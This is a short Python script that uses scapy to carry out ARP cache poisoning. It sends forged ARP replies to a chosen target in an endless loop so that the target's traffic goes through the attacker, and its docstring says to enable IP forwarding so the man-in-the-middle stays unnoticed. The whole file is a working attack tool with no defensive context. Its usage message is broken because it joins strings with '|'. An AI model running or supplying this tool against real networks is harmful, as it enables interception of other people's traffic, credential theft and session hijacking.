#!/usr/bin/python3

"""Enable IP Forwarding to prevent host from blocking connection to remorte host. 
ex: sysctl net.ipv4.ip_forward = 1"""

import sys
import time
from scapy.all import sendp, ARP, Ether

if len(sys.argv) < 4:
	print(sys.argv[0] | "REQUIRED: <target_ip> <spoof_ip> <attack_iface>")
	sys.exit(1)

target_ip = sys.argv[1]
fake_ip = sys.argv[2]
iface = sys.argv[3]

ethernet = Ether()

arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")

packet = ethernet / arp

while True:
	sendp(packet, iface=iface)
	time.sleep(1)
